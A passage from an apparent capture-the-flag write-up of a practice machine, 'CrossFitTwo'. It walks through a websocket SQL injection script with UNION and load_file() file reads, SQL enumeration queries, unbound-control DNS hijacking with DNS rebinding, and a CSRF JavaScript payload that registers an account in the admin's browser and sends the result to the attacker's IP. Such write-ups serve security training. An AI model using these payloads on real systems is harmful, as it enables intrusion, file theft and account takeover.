+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span> <span class="s">'--union'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Enable UNION injection'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-f'</span><span class="p">,</span> <span class="s">'--file'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Enable file reading'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">async</span> <span class="k">def</span> <span class="nf">lets_talk</span><span class="p">():</span>
+    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">message</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">params</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">union</span><span class="p">:</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"available"</span><span class="p">,</span> <span class="s">"params"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"3 UNION SELECT (</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">params</span><span class="si">}</span><span class="s">),2"</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+                <span class="c1"># print(f"&lt; {payload}")
+</span>                <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+                <span class="n">msg</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+                <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+                <span class="n">rspn</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"debug"</span><span class="p">][</span><span class="mi">5</span><span class="p">:</span><span class="o">-</span><span class="mi">9</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">','</span><span class="p">,</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">rspn</span><span class="p">)</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+            <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="nb">file</span><span class="p">:</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"available"</span><span class="p">,</span> <span class="s">"params"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"3 UNION SELECT (select load_file('</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">params</span><span class="si">}</span><span class="s">')),2"</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+                <span class="c1"># print(f"&lt; {payload}")
+</span>                <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+                <span class="n">msg</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+                <span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+                <span class="n">rspn</span> <span class="o">=</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"debug"</span><span class="p">][</span><span class="mi">5</span><span class="p">:</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">rspn</span><span class="p">)</span>
+                <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">payload</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="s">"available"</span><span class="p">,</span> <span class="s">"params"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">params</span><span class="p">,</span> <span class="s">"token"</span><span class="p">:</span> <span class="n">json_data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]})</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"&lt; </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"&gt; </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">parser</span><span class="p">.</span><span class="n">print_help</span><span class="p">()</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">asyncio</span><span class="p">.</span><span class="n">get_event_loop</span><span class="p">().</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">lets_talk</span><span class="p">())</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">' KeyboardInterrupt'</span><span class="p">)</span>
+</pre></table></code></div></div><ul><li><strong>Retrieve all Databases names:</strong> <code class="language-plaintext highlighter-rouge">SELECT group_concat(schema_name) FROM information_schema.schemata</code><li><strong>Retrieve all tables of specific database:</strong> <code class="language-plaintext highlighter-rouge">Select group_concat(table_name) from information_schema.tables where table_schema='&lt;database_name&gt;'</code><li><strong>Retrieve all columns of specific table:</strong> <code class="language-plaintext highlighter-rouge">SELECT group_concat(column_name) from information_schema.columns where table_name ='tablename'</code><li><strong>Retrieve columns:</strong> <code class="language-plaintext highlighter-rouge">SELECT group_concat(column1,":",column2) from &lt;database_Name&gt;.&lt;table_Name&gt;</code><li><strong>Check dbms users privileges:</strong> <code class="language-plaintext highlighter-rouge">SELECT group_concat(grantee,':',privilege_type) FROM information_schema.user_privileges</code><li><strong>Read file:</strong> <code class="language-plaintext highlighter-rouge">SELECT load_file('&lt;file_name&gt;')</code>**</ul><h2 id="dns-hijacking"><span class="mr-2">DNS Hijacking</span><a href="#dns-hijacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="relayd"><span class="mr-2">relayd</span><a href="#relayd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>While checking conf files, one interesting file found is httpd server.</p><ul><li>OpenBSD httpd server config file default path is <code class="language-plaintext highlighter-rouge">/etc/httpd.conf</code></ul><p>host/subdomains listening on different local port but we can access them from remote port 80.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>❯ python websocket.py <span class="nt">-f</span> <span class="nt">-p</span> <span class="s2">"/etc/httpd.conf"</span>
+
+server <span class="s2">"0.0.0.0"</span> <span class="o">{</span>
+	no log
+	listen on lo0 port 8000
+
+... <span class="o">[</span>snip] ...
+
+server <span class="s2">"employees"</span> <span class="o">{</span>
+	no log
+	listen on lo0 port 8001
+
+... <span class="o">[</span>snip] ...
+
+server <span class="s2">"chat"</span> <span class="o">{</span>
+	no log
+	listen on lo0 port 8002
+
+... <span class="o">[</span>snip] ...
+</pre></table></code></div></div><p>OpenBSD uses <a href="https://man.openbsd.org/relayd.8"><code class="language-plaintext highlighter-rouge">relayd</code></a> for doing this.</p><ul><li>relayd is a daemon to relay and dynamically redirect incoming connections to a target host.<li>OpenBSD relayd config file path is <code class="language-plaintext highlighter-rouge">"/etc/relayd.conf"</code></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+</pre><td class="rouge-code"><pre>❯ python websocket.py <span class="nt">-f</span> <span class="nt">-p</span> <span class="s1">'/etc/relayd.conf'</span>
+table&lt;1&gt;<span class="o">{</span>127.0.0.1<span class="o">}</span>
+table&lt;2&gt;<span class="o">{</span>127.0.0.1<span class="o">}</span>
+table&lt;3&gt;<span class="o">{</span>127.0.0.1<span class="o">}</span>
+table&lt;4&gt;<span class="o">{</span>127.0.0.1<span class="o">}</span>
+http protocol web<span class="o">{</span>
+	pass request quick header <span class="s2">"Host"</span> value <span class="s2">"*crossfit-club.htb"</span> forward to &lt;3&gt;
+	pass request quick header <span class="s2">"Host"</span> value <span class="s2">"*employees.crossfit.htb"</span> forward to &lt;2&gt;
+	match request path <span class="s2">"/*"</span> forward to &lt;1&gt;
+	match request path <span class="s2">"/ws*"</span> forward to &lt;4&gt;
+	http websockets
+<span class="o">}</span>
+
+table&lt;5&gt;<span class="o">{</span>127.0.0.1<span class="o">}</span>
+table&lt;6&gt;<span class="o">{</span>127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4<span class="o">}</span>
+http protocol portal<span class="o">{</span>
+	pass request quick path <span class="s2">"/"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/index.html"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/home"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/login"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/chat"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/js/*"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/css/*"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/fonts/*"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/images/*"</span> forward to &lt;5&gt;
+	pass request quick path <span class="s2">"/favicon.ico"</span> forward to &lt;5&gt;
+	pass forward to &lt;6&gt;
+	http websockets
+<span class="o">}</span>
+
+relay web<span class="o">{</span>
+	listen on <span class="s2">"0.0.0.0"</span> port 80
+	protocol web
+	forward to &lt;1&gt; port 8000
+	forward to &lt;2&gt; port 8001
+	forward to &lt;3&gt; port 9999
+	forward to &lt;4&gt; port 4419
+<span class="o">}</span>
+
+relay portal<span class="o">{</span>
+	listen on 127.0.0.1 port 9999
+	protocol portal
+	forward to &lt;5&gt; port 8002
+	forward to &lt;6&gt; port 5000 mode source-hash
+<span class="o">}</span>
+</pre></table></code></div></div><ul><li>Found another host <strong><code class="language-plaintext highlighter-rouge">crossfit-club.htb</code></strong><li><code class="language-plaintext highlighter-rouge">"*crossfit-club.htb"</code> And <code class="language-plaintext highlighter-rouge">"*employees.crossfit.htb"</code> contains a wildcard.</ul><h3 id="unbound"><span class="mr-2">Unbound</span><a href="#unbound" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>with file read we can also read unbound config file and retrieve its server and control key. With these files we can edit server dns entries.</p><ul><li>OpenBSD install unbound config file in <code class="language-plaintext highlighter-rouge">/var/unbound/etc/unbound.conf</code></ul><p>Get cerf file locations from config file</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>server-key-file: <span class="s2">"/var/unbound/etc/tls/unbound_server.key"</span>
+server-cert-file: <span class="s2">"/var/unbound/etc/tls/unbound_server.pem"</span>
+control-key-file: <span class="s2">"/var/unbound/etc/tls/unbound_control.key"</span>
+control-cert-file: <span class="s2">"/var/unbound/etc/tls/unbound_control.pem"</span>
+</pre></table></code></div></div><p>Download all file and add there path in a local unbound config file to connect to remote unbound server.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>remote-control:
+    server-cert-file: <span class="s2">"/crossFitTwo/dump/unbound_server.pem"</span>
+    control-key-file: <span class="s2">"/crossFitTwo/dump/unbound_control.key"</span>
+    control-cert-file: <span class="s2">"/crossFitTwo/dump/unbound_control.pem"</span>
+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/unbound-connect.png" alt="" data-proofer-ignore></p><h3 id="dns-hijacking-1"><span class="mr-2">DNS Hijacking</span><a href="#dns-hijacking-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li><p>There is a “forgot password” option in <code class="language-plaintext highlighter-rouge">employees.crossfit.htb</code> login page.</p><p><img data-src="/assets/img/posts/crossFitTwo/pass-reset.png" alt="" data-proofer-ignore></p><li><p>Found Email address from sql injection</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ python websocket.py -u -p "SELECT group_concat(email) from employees.employees"
+david.palmer@crossfit.htb
+jack.parker@crossfit.htb
+maria.williams@crossfit.htb
+will.smith@crossfit.htb
+</pre></table></code></div></div></ul><p>and <code class="language-plaintext highlighter-rouge">david.palmer@crossfit.htb</code> is admin.</p><ul><li>When we send password reset request, server send a email to that user with reset link.<li>From relayd config file we found that server resolve <code class="language-plaintext highlighter-rouge">*employees.crossfit.htb</code> where wildcard can be anything it still resolve <code class="language-plaintext highlighter-rouge">employees.crossfit.htb</code>.<li>And we can write any rule in unbound-control.<ul><li>unbound flag <code class="language-plaintext highlighter-rouge">forward_add [+i]</code> allow to add forward zone.</ul></ul><p>If we add a new host “<code class="language-plaintext highlighter-rouge">anything-employees.crossfit.htb</code>” in unbound-control that resolve from attacker dns server and than request password reset from that domain. It will go through relayd proxy and resolve this domain as “<code class="language-plaintext highlighter-rouge">*employees.crossfit.htb</code>” and send email from “<code class="language-plaintext highlighter-rouge">anything-employees.crossfit.htb</code>” domain. When Victim click on reset link, crossfit’s unbound-control forward this domain’s dns query to attacker’s dns server and attacker dns server will return attacker’s http server’s ip address for that domain.</p><p>this is a messed up situation, that why i create a mind map to understand this situation clearly.</p><p><img data-src="/assets/img/posts/crossFitTwo/Crossfit-mindmap.png" alt="" data-proofer-ignore></p><h4 id="add-forward-zone-rule-in-unbound-control"><span class="mr-2">Add forward zone rule in unbound-control</span><a href="#add-forward-zone-rule-in-unbound-control" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><ul><li>from unbound-control <a href="https://www.nlnetlabs.nl/documentation/unbound/unbound-control/">man page</a>, There is a flag <code class="language-plaintext highlighter-rouge">forward_add [+i]</code> that “Add a new forward zone to running unbound.”</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>unbound-control <span class="nt">-c</span> unbound.conf <span class="nt">-s</span> 10.10.10.232 forward_add +i &lt;Domain_name&gt; &lt;DNS_server_IP&gt;
+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/add-nbound-zone.png" alt="" data-proofer-ignore></p><h4 id="setup-fake-dns-and-http-server"><span class="mr-2">Setup fake dns and http server</span><a href="#setup-fake-dns-and-http-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>dnschef <span class="nt">-i</span> &lt;VPN_IP&gt; <span class="nt">--fakedomains</span> &lt;Domain_name&gt; <span class="nt">--fakeip</span> &lt;VPN_IP&gt;
+</pre></table></code></div></div><p><img data-src="/assets/img/posts/crossFitTwo/dnschef-tun0.png" alt="" data-proofer-ignore></p><p>Get DNS quarry but don’t get any http request. Server response with “Only local hosts are allowed”. That means there are some security measures in the server that checks if dns resolves localhost or not.</p><p>Replacing domain ip to localhost <code class="language-plaintext highlighter-rouge">127.0.0.1</code></p><p><img data-src="/assets/img/posts/crossFitTwo/dnschef-l0.png" alt="" data-proofer-ignore></p><p>This time get more dns queries, But still don’t get any http request from victim. That’s because victim can not reach to attacker’s localhost.</p><h3 id="dns-rebinding"><span class="mr-2">DNS Rebinding</span><a href="#dns-rebinding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Here DNS Rebinding comes into play.</p><p>Basic motive of dns rebinding is that the server accepts a certain number of requests from a client for a domain and then it changes the IP address to a different one.</p><p><code class="language-plaintext highlighter-rouge">dnschef</code> don’t have dns rebinding feature but there is a python script on github <a href="https://github.com/Crypt0s/FakeDns">FakeDns</a> that can help in this situation.</p><p>Create config file for <code class="language-plaintext highlighter-rouge">FakeDns</code> with a dns rebind rule.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>A ex-employees.crossfit.htb 127.0.0.1 2%10.10.15.71
+</pre></table></code></div></div><p>We add 2 before <code class="language-plaintext highlighter-rouge">%</code> that means that server takes 2 request on IP <code class="language-plaintext highlighter-rouge">127.0.0.1</code> and then change IP to <code class="language-plaintext highlighter-rouge">10.10.15.71</code>.</p><p>And this time get request on http server and get reset link.</p><p><img data-src="/assets/img/posts/crossFitTwo/fakedns-rebind.png" alt="" data-proofer-ignore></p><p>But link is not working.</p><p><img data-src="/assets/img/posts/crossFitTwo/reset-disable.png" alt="" data-proofer-ignore></p><p>But reset request we got on our server contains <code class="language-plaintext highlighter-rouge">Referer</code> header value <code class="language-plaintext highlighter-rouge">http://crossfit-club.htb/</code>.</p><p>This means that user click on link from <code class="language-plaintext highlighter-rouge">crossfit-club.htb</code> vHost.</p><h2 id="vhost"><span class="mr-2">vHost</span><a href="#vhost" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">crossfit-club.htb</code> have a login page that send login request to a api endpoint.</p><p><img data-src="/assets/img/posts/crossFitTwo/login-api.png" alt="" data-proofer-ignore></p><p>And there is a signup option, That is disabled.</p><p><img data-src="/assets/img/posts/crossFitTwo/signup-disable.png" alt="" data-proofer-ignore></p><p>Found 2 endpoints from api fuzzing with GET method and 2 from POST method.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">-u</span> http://crossfit-club.htb/api/FUZZ
+
+auth                    <span class="o">[</span>Status: 200, Size: 66, Words: 1, Lines: 1]
+ping                    <span class="o">[</span>Status: 200, Size: 71, Words: 3, Lines: 1]
+
+
+ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">-u</span> http://crossfit-club.htb/api/FUZZ <span class="nt">-X</span> POST
+
+login                   <span class="o">[</span>Status: 200, Size: 50, Words: 3, Lines: 1]
+signup                  <span class="o">[</span>Status: 200, Size: 50, Words: 3, Lines: 1]
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">auth</code> response with a toked</p><p><img data-src="/assets/img/posts/crossFitTwo/api-auth.png" alt="" data-proofer-ignore></p><p>Try to get signup, return csrf token error</p><p><img data-src="/assets/img/posts/crossFitTwo/signup-csrf-error.png" alt="" data-proofer-ignore></p><p>When try to login, get the csrf token header</p><p><img data-src="/assets/img/posts/crossFitTwo/login-csrf.png" alt="" data-proofer-ignore></p><p>And with csrf token, get “Only administrators can register accounts.” message.</p><p><img data-src="/assets/img/posts/crossFitTwo/admin-only-signup.png" alt="" data-proofer-ignore></p><h2 id="csrf"><span class="mr-2">CSRF</span><a href="#csrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="account-registration"><span class="mr-2">Account Registration</span><a href="#account-registration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>We already make admin to connect to our http server from dns hijacking. Here we can use cross site request forgery to execute javascript from admin browser which register new account on behalf of admin.</p><p>Create a javascript that execute from victim’s browser and register account. <em><a href="https://www.youtube.com/watch?v=OUjdPa11tGw&amp;t=4770s">from ippsec video</a></em></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+
+<span class="c1">// retrive csrf token from admin login session.</span>
+<span class="kd">var</span> <span class="nx">req1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://crossfit-club.htb/api/auth</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req1</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
+
+<span class="c1">// register new account from admin browser.</span>
+<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://crossfit-club.htb/api/signup</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">X-CSRF-TOKEN</span><span class="dl">"</span><span class="p">,</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span> <span class="p">{</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">poorduck</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">poorduck@duckland.duck</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">p00rduck</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">confirm</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">p00rduck</span><span class="dl">"</span><span class="p">}</span> <span class="p">);</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+
+<span class="c1">// send signup response to attacker's server.</span>
+<span class="kd">var</span> <span class="nx">req3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req3</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://10.10.15.71/?</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">req2</span><span class="p">.</span><span class="nx">response</span><span class="p">));</span>
+<span class="nx">req3</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></table></code></div></div><p>Save as <code class="language-plaintext highlighter-rouge">password-reset.php</code> in the www directory.</p><p>And execute same <a href="#dns-rebinding">DNS Rebinding</a> attack. If everything goes well we’ll get a extra request that contains signup response.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>unbound-control <span class="nt">-c</span> unbound.conf <span class="nt">-s</span> 10.10.10.232 forward_add +i ex-exployees.crossfit.htb 10.10.15.71
+<span class="nb">sudo </span>php <span class="nt">-S</span> 0.0.0.0:80
